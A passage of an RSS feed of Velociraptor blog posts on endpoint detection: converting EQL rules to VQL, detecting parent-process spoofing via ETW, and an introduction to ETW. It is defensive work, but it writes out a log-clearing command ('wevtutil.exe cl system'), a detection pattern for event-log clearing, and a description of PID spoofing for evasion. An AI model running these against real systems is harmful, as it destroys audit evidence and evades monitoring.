 &lt;tr>
 &lt;td>System.EventID&lt;/td>
 &lt;td>maps to event.type = &amp;ldquo;start&amp;rdquo;&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>EventData.Image&lt;/td>
 &lt;td>strip directory part and store in &lt;code>process.name&lt;/code>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>EventData.OriginalFileName&lt;/td>
 &lt;td>stored in &lt;code>process.pe.original_file_name&lt;/code>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>EventData.CommandLine&lt;/td>
 &lt;td>is split into array and stored in &lt;code>process.args&lt;/code>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;hr>
&lt;p>All the details of how the original Sysmon event fields are
transformed to ECS fields can be found coded in
&lt;a href="https://github.com/elastic/beats/blob/master/x-pack/winlogbeat/module/sysmon/config/winlogbeat-sysmon.js" target="_blank" >winlogbeat-sysmon.js&lt;/a>
&lt;/p>
&lt;h2 id="how-can-we-use-eql-detection-queries">How can we use EQL detection queries?&lt;/h2>
&lt;p>So now that we understand how EQL detections work, how can we use the
same detection logic in Velociraptor? Velociraptor&amp;rsquo;s philosophy is
that detection should be distributed - rather than forwarding all raw
events to a central place for triaging, we wish to be able to do the
detection directly on the endpoint.&lt;/p>
&lt;p>In order to do this, we need to convert the EQL to VQL that works
directly on the raw source event logs as produced by Sysmon - in other
words we need to reverse the above transformation from the ECS fields
mentioned in the EQL query back to the original event log fields found
on the endpoint.&lt;/p>
&lt;h3 id="the-eql2vql-project">The &lt;code>eql2vql&lt;/code> project&lt;/h3>
&lt;p>Let me introduce a new project to automatically convert EQL detection
rules to VQL artifacts: &lt;a href="https://github.com/Velocidex/eql2vql" target="_blank" >https://github.com/Velocidex/eql2vql&lt;/a>
&lt;/p>
&lt;p>The aim of this project is to automatically produce a VQL artifact
that parses a set of EQL detection rules into a single VQL
artifact. The produced artifact can be used to hunt for notable event
log patterns at scale in minutes using Velociraptor&amp;rsquo;s hunting
capabilities!&lt;/p>
&lt;p>Let&amp;rsquo;s take a look at an example to illustrate how it works. I will
keep it simple and just convert the single rule
&lt;code>defense_evasion_clearing_windows_event_logs.toml&lt;/code> containing the
sample EQL query above, to create a new VQL artifact&lt;/p>
&lt;pre>&lt;code class="language-sh">$ python3 parser/eql2vql.py -p SysmonEVTXLogProvider ~/projects/detection-rules/rules/windows/defense_evasion_clearing_windows_event_logs.toml -o /tmp/detection_vql.yaml
Created artifact 'Windows.Sysmon.Detection' with 1 detections
&lt;/code>&lt;/pre>
&lt;p>In this case I selected the &lt;code>SysmonEVTXLogProvider&lt;/code> as I wanted to
search the EVTX files directly on the endpoint.&lt;/p>
&lt;p>Let&amp;rsquo;s take a look at the produced VQL&lt;/p>
&lt;pre>&lt;code class="language-vql">LET SysmonGenerator = generate(name=&amp;quot;Sysmon&amp;quot;,
query={
 SELECT * FROM foreach(row={SELECT FullPath FROM glob(globs=EVTXGlob)},
 query={
 SELECT *
 FROM parse_evtx(filename=FullPath)
 })
}, delay=500)

LET ProcessInfo = generate(name=&amp;quot;ProcessInfo&amp;quot;, query={
 SELECT *,
 basename(path=EventData.ParentImage) AS ParentImageBase,
 basename(path=EventData.Image) AS ImageBase,
 commandline_split(command=EventData.CommandLine) AS CommandArgs,
 get(item=ProcessTypes, field=str(str=System.EventID.Value)) AS event_type
 FROM SysmonGenerator
 WHERE System.EventID.Value in (1, 5)
})

LET ProcessTypes &amp;lt;= dict(`1`=&amp;quot;start&amp;quot;, `5`=&amp;quot;stop&amp;quot;)

LET _ClearingWindowsEventLogs = SELECT 'Clearing Windows Event Logs' AS Detection,
 EventData.User AS User,
 EventData.CommandLine AS CommandLine,
 EventData.ParentImage AS ParentImage,
 EventData.Image AS Image,
 EventData.UtcTime AS UtcTime,
 EventData || UserData AS _EventData,
 System AS _System
FROM ProcessInfo
WHERE ( ( event_type IN ('process_started', 'start' )
 AND ( ImageBase =~ '^wevtutil\\.exe$' OR EventData.OriginalFileName = 'wevtutil.exe' )
 AND CommandArgs =~ '^/e:false$|^cl$|^clear-log$' ) OR ( ImageBase =~ '^powershell\\.exe$'
 AND CommandArgs =~ '^Clear-EventLog$' ) )

SELECT * FROM _ClearingWindowsEventLogs
&lt;/code>&lt;/pre>
&lt;p>The query is split into two main parts:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>The &lt;code>Provider&lt;/code> is a set of queries that extract Sysmon EVTX events
ready for further filtering. In this case we just read the events
from the EVTX files on disk.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The second part of the query implements the detection logic as
expressed by the EQL query above.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>Let&amp;rsquo;s test this artifact on our test system that we used previously to
run the command &lt;code>wevtutil.exe cl system&lt;/code>, I will first add the new
artifact to Velociraptor by simply copy/pasting the generated code as
a new artifact in the GUI&lt;/p>
&lt;p>











&lt;figure id="a0c359aa08736e2e88ef9a501341230c">
 &lt;div data-featherlight="#a0c359aa08736e2e88ef9a501341230c" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-eql2vql/adding_new_artifact.png" alt="Adding the new detection artifact">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="adding_new_artifact.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Adding the new detection artifact
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Now I will schedule the artifact for collection on my endpoint&lt;/p>
&lt;p>











&lt;figure id="650d073d49924e82dfc965743b11f957">
 &lt;div data-featherlight="#650d073d49924e82dfc965743b11f957" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-eql2vql/collecting_new_artifact.png" alt="Collecting the new detection artifact">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="collecting_new_artifact.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Collecting the new detection artifact
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>And in literally seconds, I find the system that triggered the rule
and the command line that triggered it.&lt;/p>
&lt;p>











&lt;figure id="333f07ddea8a74160b9031e80440b198">
 &lt;div data-featherlight="#333f07ddea8a74160b9031e80440b198" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-eql2vql/detecting_new_artifact.png" alt="Detecting with the new artifact">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="detecting_new_artifact.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Detecting with the new artifact
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>To search a large number of hosts, I can start a hunt with this
artifact and in minutes find which of my hosts triggered the rule.&lt;/p>
&lt;h3 id="adding-more-rules">Adding more rules&lt;/h3>
&lt;p>We have seen how the EQL translates to a VQL detection query, but what
if we have many rules? Lets convert the entire set of detection rules
into a single artifact.&lt;/p>
&lt;pre>&lt;code class="language-sh">$ python3 parser/eql2vql.py -p SysmonEVTXLogProvider ~/projects/detection-rules/rules/windows/* -o /tmp/detection_vql.yaml
Created artifact 'Windows.Sysmon.Detection' with 165 detections
&lt;/code>&lt;/pre>
&lt;p>The new artifact applies all the detection queries simultaneously on
all rows from the EVTX files. Collecting it again we have found some
new detections!&lt;/p>
&lt;p>











&lt;figure id="4136667118bc38b57f7e128dde53283b">
 &lt;div data-featherlight="#4136667118bc38b57f7e128dde53283b" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-eql2vql/collecting_more_detections.png" alt="Detecting with the full set of rules">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="collecting_more_detections.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Detecting with the full set of rules
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h2 id="real-time-detections">Real time detections&lt;/h2>
&lt;p>Velociraptor&amp;rsquo;s hunting capabilities make it a breeze for actively
searching for signed of past compromise on endpoints. However what
about real time alerting? It would be nice to receive immediate
notification when a detection rule is triggered.&lt;/p>
&lt;p>Velociraptor supports real time &lt;a href="" >client monitoring&lt;/a>
 via event queries. Event queries run
constantly on the endpoint receiving rows from events.&lt;/p>
&lt;p>We have previously explored how Event Queries can be used for real
time monitoring and in particular how VQL can leverage &lt;a href="https://docs.velociraptor.app/blog/2021/2021-08-18-velociraptor-and-etw/" >Event Tracing
for Windows&lt;/a>
 (ETW).&lt;/p>
&lt;h3 id="using-eql-detections-with-real-time-monitoring">Using EQL detections with real time monitoring&lt;/h3>
&lt;p>The &lt;code>eql2vql&lt;/code> project contains a second provider that reads Sysmon
events directly from ETW sources. This bypasses the windows event log
system completely, and applies the VQL directly on real time ETW
events.&lt;/p>
&lt;pre>&lt;code class="language-sh">$ python3 parser/eql2vql.py -p SysmonETWProvider ~/projects/detection-rules/rules/windows/defense_evasion_clearing_windows_event_logs.toml -o /tmp/detection_vql.yaml
Created artifact 'Windows.Sysmon.EventDetection' with 1 detections
&lt;/code>&lt;/pre>

&lt;div class="mynotices tip">
 &lt;div heading=" Advantage of ETW ">&lt;p>We have previously discussed how event logs can be &lt;a href="https://docs.velociraptor.app/blog/2021/2021-01-29-disabled-event-log-files-a3529a08adbe/" >turned off or
disabled&lt;/a>

which would interfere with tools that rely on event logs
directly. However, ETW sources still work, even if the event log itself
is disabled.&lt;/p>
&lt;/div>
&lt;/div>


&lt;p>This time we have used the &lt;code>SysmonETWProvider&lt;/code> to source the Sysmon
events directly from Sysmon&amp;rsquo;s ETW subsystem:&lt;/p>
&lt;pre>&lt;code class="language-vql">LET SysmonGenerator = generate(name=&amp;quot;Sysmon&amp;quot;,
query={
 SELECT dict(EventID=dict(Value=System.ID),
 Timestamp=System.TimeStamp) AS System,
 EventData
 FROM watch_etw(guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}')
 WHERE get(field=&amp;quot;EventData&amp;quot;)
}, delay=500)

--- Rest of query is exactly the same as before
&lt;/code>&lt;/pre>
&lt;p>The only difference here is that the artifact produced is a client
monitoring artifact so it can be installed on all clients permanently,
continuously monitoring their Sysmon event source for the same EQL
detections. As soon as an EQL rule matches, Velociraptor will emit a
single row and send it to the server.&lt;/p>
&lt;p>











&lt;figure id="b5bba1c3df739fccc8467edb4e5830c7">
 &lt;div data-featherlight="#b5bba1c3df739fccc8467edb4e5830c7" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-eql2vql/real_time_detections.png" alt="Real time detections">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="real_time_detections.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Real time detections
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>We can escalate such detections, through a number of mechanisms,
such as &lt;a href="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/" >Slack alerts&lt;/a>
, or escalate to an external case management tool like &lt;a href="https://wlambertts.medium.com/zero-dollar-detection-and-response-orchestration-with-n8n-security-onion-thehive-and-10b5e685e2a1" target="_blank" >The Hive
&lt;/a>
. See &lt;a href="https://docs.velociraptor.app/docs/server_automation/server_monitoring/" >Server Monitoring&lt;/a>
 for more information.&lt;/p>
&lt;p>We can even use the resulting VQL artifact as a base for other queries
to provide further enrichment and response capabilities.&lt;/p>
&lt;h2 id="the-velociraptor-difference">The Velociraptor difference&lt;/h2>
&lt;p>In this blog post we discussed a current effort to port EQL detections
to Velociraptor. Being able to automatically convert EQL detection
rules into VQL allows us to apply these rules in a wider context - We
can hunt a large set of EVTX files for past compromise, or apply the
same rules in real time to allow the endpoint to autonomously detect
and response without needing to be online or connected to the SIEM.&lt;/p>
&lt;p>The main premise of Velociraptor&amp;rsquo;s value proposition is to &lt;code>push the processing to the endpoint&lt;/code>. Instead of feeding all events from
thousands of endpoints to a central location and then using a high
performance database to churn though thousands of events per second,
Velociraptor simply runs the VQL query &lt;strong>on each endpoint
independently&lt;/strong> and forwards only those high value detections to the
server. This solution scales very well because each endpoint is doing
it&amp;rsquo;s own independent detection and does not need to forward &lt;strong>all&lt;/strong>
events to the server. What does get forwarded is a very high value
subset of events that typically indicate a successful detection!&lt;/p>
&lt;h2 id="conclusions-and-further-work">Conclusions and further work&lt;/h2>
&lt;p>We are still working on the EQL to VQL conversion engine. Currently
not all EQL syntax is fully converted to VQL yet so some detection
rules can not be converted. We hope that with time we build enough
coverage to make the conversion as accurate as possible.&lt;/p>
&lt;p>Since VQL is a much more capable language with access to a lot more
data (since it is running on the endpoint), we hope to build more
accurate and powerful detection rules. For example by correlating
information from the filesystem, NTFS analysis, Yara scans, memory
analysis etc. These capabilities can build on the basic EQL detection
rules to help eliminate false positives. At the same time we can draw
on the existing body of work in detection rules available with EQL.&lt;/p>
&lt;p>We decided to focus on EQL because it is fairly similar to VQL in
spirit (both are query languages) so the conversion is a little
easier. But there are other sources of threat intelligence such as Sigma
which also output to EQL! A good coverage of the EQL capabilities will
get us Sigma support as well.&lt;/p>
&lt;p>I wanted to write about this effort and have the community help us in
testing, further suggestions and other contributions, even in this
very early stage. If you would are interested in improving endpoint
detection technology, take Velociraptor for a spin! It is available on
&lt;a href="https://github.com/Velocidex/velociraptor" target="_blank" >GitHub&lt;/a>
 under an open
source license. As always, please file issues on the bug tracker or
ask questions on our mailing list
&lt;a href="mailto:velociraptor-discuss@googlegroups.com" >velociraptor-discuss@googlegroups.com&lt;/a>
. You can also chat with us
directly on discord at &lt;a href="https://www.velocidex.com/discord" target="_blank" >https://www.velocidex.com/discord&lt;/a>
&lt;/p></description></item><item><title>ETW Part 2: Process Parent Spoofing</title><link>https://docs.velociraptor.app/blog/2021/2021-09-03-process-spoofing/</link><pubDate>Fri, 03 Sep 2021 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2021/2021-09-03-process-spoofing/</guid><description>&lt;h2 id="process-parent-spoofing">Process Parent Spoofing&lt;/h2>
&lt;p>A lot of the current state of the art detection techniques rely on
process creation logs, and their implied parent/child
relationships. For example, many detection rules alert when Powershell
is launched from &lt;code>WinWord.exe&lt;/code> as it typically indicates a macro has
started a powershell payload.&lt;/p>
&lt;p>Many people are sometimes surprised to learn that on Windows
parent/child process relationship is not particularly reliable. Back
in 2009, Didier Stevens released a demo tool called
&lt;a href="https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/" target="_blank" >SelectMyParent&lt;/a>

demonstrating a quirk of the Windows &lt;code>CreateProcess&lt;/code> API that allows any
caller to simply spoof the parent process ID. This is particularly
troublesome, especially when so much of the DFIR industry relies on
process tracing of parent/child call chain. Further, parent spoofing
does not require any special privileges and can be performed by
non-admin users as well.&lt;/p>
&lt;p>Didier Stevens wrote about it again in 2017&amp;rsquo;s post &lt;a href="https://blog.didierstevens.com/2017/03/20/" target="_blank" >That Is Not My
Child Process!&lt;/a>
 where even
&lt;code>Sysmon&lt;/code> and &lt;code>Volatility memory analysis&lt;/code> are demonstrated to be
fooled by &lt;code>SelectMyParent&lt;/code>!&lt;/p>
&lt;p>If you thought this was an unknown technique, rest assured that most
attack tools integrate parent process spoofing already. For example
&lt;a href="https://www.youtube.com/watch?v=DOe7WTuJ1Ac" target="_blank" >Cobalt Strike&lt;/a>
 has been
able to do this for a number of years now, and the technique is
actively used frequently to avoid behavioural detection.&lt;/p>
&lt;p>How can one detect this kind of spoofing? I found it surprising that
there are no indicators that a process has been spoofed that can be
gathered from an already running process (If you know of any, please
let me know!). As Didier Stevens shows in his 2017 post above, even
memory analysis can not reveal the real parent of a process.&lt;/p>
&lt;p>The only way to learn that a process parent has been spoofed is using
ETW, as outlined in the F-Secure post &lt;a href="https://blog.f-secure.com/detecting-parent-pid-spoofing/" target="_blank" >Detecting Parent PID
Spoofing&lt;/a>
. Let&amp;rsquo;s
play with this detection and see how effective it is.&lt;/p>
&lt;h3 id="spoofing-parent-processes">Spoofing Parent processes&lt;/h3>
&lt;p>I will use Didier&amp;rsquo;s tool &lt;code>SelectMyParent&lt;/code> to spoof &lt;code>notepad.exe&lt;/code> as
being a child of &lt;code>OneDrive.exe&lt;/code>. First I use the task manager to find
the Process ID of OneDrive and then start notepad with this as the
parent.&lt;/p>
&lt;p>











&lt;img class="inline" src="spoofing_notepad_parent.png" />




&lt;/p>
&lt;p>On this system I have Sysmon installed, so I will find the process
creation event in the event viewer.&lt;/p>
&lt;p>











&lt;figure id="d453b6bad9467fc8fa442ca5e65f009a">
 &lt;div data-featherlight="#d453b6bad9467fc8fa442ca5e65f009a" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-09-03-process-spoofing/sysmon_spoofed.png" alt="Sysmon event log ID 1 of spoofed process">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="sysmon_spoofed.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Sysmon event log ID 1 of spoofed process
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>It shows the parent process of notepad is &lt;code>OneDrive.exe&lt;/code>!&lt;/p>
&lt;p>Let&amp;rsquo;s write a VQL query to detect this spoofing. According to the post
above, the provider to watch is the &lt;code>Microsoft-Windows-Kernel-Process&lt;/code>
provider which has a GUID of
&lt;code>{22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716}&lt;/code>. Since the provider emits a
lot of information about all processes in the system, I will initially
narrow down event to only those that have &lt;code>notepad&lt;/code> somewhere in the
event data.&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT *
FROM watch_etw(guid=&amp;quot;{22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716}&amp;quot;)
WHERE serialize(item=EventData) =~ &amp;quot;notepad&amp;quot;
&lt;/code>&lt;/pre>
&lt;p>











&lt;figure id="1f975d275612a570cb2cb1bce50cf70e">
 &lt;div data-featherlight="#1f975d275612a570cb2cb1bce50cf70e" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-09-03-process-spoofing/spoofed_etw_query.png" alt="VQL query that detects the spoofed process">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="spoofed_etw_query.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 VQL query that detects the spoofed process
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>In the above query we can see the anomaly immediately! The process
that generated the EWT event is not the same as the process parent
pid!&lt;/p>
&lt;p>This anomaly allows us to detect the spoofing behavior, now we just
need to enrich the event with extra detail of the real parent, the
spoofed parent etc. You can find the full VQL artifact on the &lt;a href="https://docs.velociraptor.app/exchange/" target="_blank" >Velociraptor Artifact Exchange&lt;/a>
 &lt;a href="https://docs.velociraptor.app/exchange/artifacts/pages/windows.etw.detectprocessspoofing/" target="_blank" >here&lt;/a>
&lt;/p>
&lt;p>











&lt;figure id="631269b45e9f3b9ed472a57ab39841f9">
 &lt;div data-featherlight="#631269b45e9f3b9ed472a57ab39841f9" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-09-03-process-spoofing/artifact_exchange.png" alt="Searching the Artifact Exchange">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="artifact_exchange.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Searching the Artifact Exchange
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>To add this artifact, I will navigate to the &lt;code>View Artifacts&lt;/code> screen,
then click &lt;code>Add an Artifact&lt;/code> button, then copy and paste the Artifact
definition from the exchange into the editor.&lt;/p>
&lt;p>











&lt;figure id="162a73e14d97cbc510e85f3783429d0b">
 &lt;div data-featherlight="#162a73e14d97cbc510e85f3783429d0b" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-09-03-process-spoofing/adding_artifact.png" alt="Adding the custom artifact">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="adding_artifact.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Adding the custom artifact
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Now I will add this artifact to all client&amp;rsquo;s monitoring
configuration. I click the &lt;code>Event Monitoring&lt;/code> screen in the GUI then
the &lt;code>Update client monitoring table&lt;/code> button.&lt;/p>
&lt;p>











&lt;figure id="8057e749cfbc6df48e97d1d6ca182741">
 &lt;div data-featherlight="#8057e749cfbc6df48e97d1d6ca182741" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-09-03-process-spoofing/targetting_monitoring.png" alt="Targeting all clients for monitoring">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="targetting_monitoring.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Targeting all clients for monitoring
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>To add the new artifact to the client&amp;rsquo;s monitoring table I will select
it in the next step.&lt;/p>
&lt;p>











&lt;figure id="daafcc1ce50cac9005cf4079b6ad30c0">
 &lt;div data-featherlight="#daafcc1ce50cac9005cf4079b6ad30c0" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-09-03-process-spoofing/add_monitoring_artifact.png" alt="Selecting the artifact to monitor">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="add_monitoring_artifact.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Selecting the artifact to monitor
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>As soon as the monitor table is updated, all clients will refresh
their configuration and start monitoring for spoofing. We can see this
by viewing the query logs in the event viewer GUI&lt;/p>
&lt;p>











&lt;figure id="9cf96b42e3d74a61d20d53cb5ff08969">
 &lt;div data-featherlight="#9cf96b42e3d74a61d20d53cb5ff08969" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-09-03-process-spoofing/monitoring_artifact_logs.png" alt="Viewing query logs for monitoring artifacts">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="monitoring_artifact_logs.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Viewing query logs for monitoring artifacts
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>We can clearly see the client is installing some ETW sessions to
monitor the provider. We also see a message every few minutes to
remind us that the client is still monitoring for events. When an
event is detected, the client immediately forwards the event to the
server.&lt;/p>
&lt;p>We can repeat our experiment and see the event generated by selecting
the &lt;code>Raw Data&lt;/code> view in the GUI.&lt;/p>
&lt;p>











&lt;figure id="4aa57800d45aa7066764e6f873c61098">
 &lt;div data-featherlight="#4aa57800d45aa7066764e6f873c61098" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-09-03-process-spoofing/monitoring_artifact_event.png" alt="Viewing hits on the server">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="monitoring_artifact_event.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Viewing hits on the server
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Again we see the events in the timeline, but this time the row
contains all the enriched information, like the real identity of the
parent process!&lt;/p>
&lt;h2 id="false-positives">False Positives&lt;/h2>
&lt;p>After having this rule running for while you might notice some false
positives - legitimate cases of parent process spoofing include the
UAC prompt.&lt;/p>
&lt;p>











&lt;figure id="f8e9ff259c7aa8fe9dc8a65aae394101">
 &lt;div data-featherlight="#f8e9ff259c7aa8fe9dc8a65aae394101" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-09-03-process-spoofing/fp.png" alt="False Positive of parent process spoofing">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="fp.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 False Positive of parent process spoofing
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>When elevating a command to &amp;ldquo;run as admin&amp;rdquo; the UAC prompt shows. Once
the prompt is approved, the UAC manager launches the target program
and spoofs the parent process.&lt;/p>
&lt;p>Other cases of legitimate parent process spoofing include the Windows
Error Reporting.&lt;/p>
&lt;p>I thought it would be interesting to see UAC elevations and program
crashes as well, so I did not filter those out.&lt;/p>
&lt;h2 id="conclusions">Conclusions&lt;/h2>
&lt;p>In this post we implemented a sophisticated ETW based detection rule
in VQL. We then wrote an artifact to encapsulate it and shared the
artifact over the &lt;code>Velociraptor Artifact Exchange&lt;/code> for other members
of the community to use.&lt;/p>
&lt;p>After adding the artifact to our deployment, we then issued the
monitoring query to all clients. When any client detected the spoofing
behavior, an event was sent to server in real time. We could then
utilize any escalation mechanism such as &lt;a href="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/" target="_blank" >escalation through
slack&lt;/a>

or a &lt;a href="https://wlambertts.medium.com/zero-dollar-detection-and-response-orchestration-with-n8n-security-onion-thehive-and-10b5e685e2a1" target="_blank" >The
Hive&lt;/a>
.&lt;/p>
&lt;p>The interesting thing about this approach is that the detection rule
is implemented on the endpoint itself. It is the endpoint that is
watching the ETW events directly and making the decision about the
anomalous nature of the event. Therefore the number of events actually
streamed to the server is very small - most events will be high value
events (such as real parent spoofing, UAC elevation and crashes).&lt;/p>
&lt;p>Other Log forwarding technologies simply stream &lt;strong>all process creation
events&lt;/strong> to a large backend server, where detection queries are
implemented in large data mining engines. This increases the volume of
irrelevant events forwarded to the server (most process execution
events are not malicious!), requiring more backend processing
capacity.&lt;/p>
&lt;p>Velociraptor&amp;rsquo;s approach is very different! Velociraptor moves the
initial analysis and triage to the end point, implemented via the
powerful VQL query language. This means we do not need a lot of
processing on the backend to scale to many thousands of monitored
endpoints, as the server only sees high value, low volume events. We
are essentially using the end point itself to create a de-centralized
detection engine for a fast and scalable alerting system.&lt;/p>
&lt;p>Unfortunately an ETW watcher must be running at the time the process
is created, to be able to identify the spoofed parent. I am not
currently aware of a way to detect that an existing process&amp;rsquo;s reported
parent is not correct (Please let me know if you know of a way!). This
means that simply collecting information at a point in time after the
process is started (as in a Velociraptor &lt;code>pslist&lt;/code> hunt for example)
does not reveal this information easily.&lt;/p>
&lt;p>In the next blog post in this series we will be looking at how ETW can
be abused by malware and some of the limitations around ETW.&lt;/p>
&lt;p>If you have a great idea for a new detection query, take
&lt;a href="https://github.com/Velocidex/velociraptor" target="_blank" >Velociraptor for a spin&lt;/a>
!
It is a available on GitHub under an open source license. As always
please file issues on the bug tracker or ask questions on our mailing
list
&lt;a href="mailto:velociraptor-discuss@googlegroups.com" >velociraptor-discuss@googlegroups.com&lt;/a>

. You can also chat with us directly on discord
&lt;a href="https://www.velocidex.com/discord" target="_blank" >https://www.velocidex.com/discord&lt;/a>

.&lt;/p>
&lt;p>There is still time to submit it to this year&amp;rsquo;s &lt;a href="https://docs.velociraptor.app/announcements/2021-artifact-contest/" target="_blank" >2021 Velociraptor
Contributor
Competition&lt;/a>
,
where you can win prizes, honor and support the entire DFIR
community. Alternatively, you can share your artifacts with the
community on &lt;a href="https://docs.velociraptor.app/exchange/" target="_blank" >Velociraptor&amp;rsquo;s Artifact
Exchange&lt;/a>
.&lt;/p></description></item><item><title>Event Tracing for Windows Part 1</title><link>https://docs.velociraptor.app/blog/2021/2021-08-18-velociraptor-and-etw/</link><pubDate>Thu, 02 Sep 2021 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2021/2021-08-18-velociraptor-and-etw/</guid><description>&lt;h2 id="digging-into-windows-internals">Digging into Windows Internals&lt;/h2>
&lt;p>One of the most important aspects of modern operating systems is
instrumentation of the running software on the system. Instrumentation
provides the visibility to understand what the system is doing at any
given moment. This is obviously important for system administrators
and software developers, but visibility into machine state is
increasingly being used for security monitoring and response.&lt;/p>
&lt;p>In Windows, system instrumentation is provided by the Event Tracing
For Windows (ETW), an extensive framework for instrumentation and
visibility.&lt;/p>
&lt;p>Much has been written about ETW so I will not cover the details here,
this blog post is the first of a series of posts that examine how we
can leverage ETW for security monitoring using Velociraptor
specifically.&lt;/p>
&lt;h3 id="event-tracing-for-windows">Event tracing for windows.&lt;/h3>
&lt;p>The Event Tracing for Windows framework is &lt;a href="https://docs.microsoft.com/en-us/windows-hardware/test/weg/instrumenting-your-code-with-etw" target="_blank" >documented extensively by
Microsoft&lt;/a>
. In
a nutshell, the framework is designed to facilitate interaction
between event &lt;strong>Consumers&lt;/strong> and event &lt;strong>Providers&lt;/strong>.&lt;/p>
&lt;p>Velociraptor provides the VQL event plugin &lt;code>watch_etw()&lt;/code> to register
Velociraptor as a &lt;strong>Consumer&lt;/strong>. If you have not read about
Velociraptor&amp;rsquo;s event queries, check out the
&lt;a href="https://docs.velociraptor.app/docs/vql/events/" target="_blank" >documentation&lt;/a>
. In
Velociraptor, event queries allow us to write real time monitoring
rules on the endpoint, then forward events to the server, enrich the
event with other information or respond to the event autonomously.&lt;/p>
&lt;p>In this blog post we will go through some examples to illustrate the
general technique but there are so many possibilities for advanced
detection rules.&lt;/p>
&lt;h3 id="exploring-etw---monitoring-dns-lookups">Exploring ETW - Monitoring DNS lookups&lt;/h3>
&lt;p>In this blog post, we will be building a Velociraptor query to monitor
for DNS lookups on the endpoint. We mentioned previously that ETW
connects providers and consumers, so our first task is simply to find
a provider that will provider relevant data.&lt;/p>
&lt;p>In this post we explore how you might develop new ETW based queries by
discovering new providers and experimenting with novel detection
rules.&lt;/p>
&lt;p>ETW is designed to be self documented via &lt;code>manifest&lt;/code> files, so each
provider in the system can describe what it will provide to some
extent. You can see all the providers on your system using the &lt;code>logman query providers&lt;/code> command. We can immediately see some providers
identified by the globally unique identifier (GUID).&lt;/p>
&lt;p>











&lt;figure id="62ddf28e84b747dba137bcc34449c34f">
 &lt;div data-featherlight="#62ddf28e84b747dba137bcc34449c34f" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-08-18-velociraptor-and-etw/query_providers.png" alt="Querying providers on the command line">
 &lt;/div>
 &lt;figcaption>
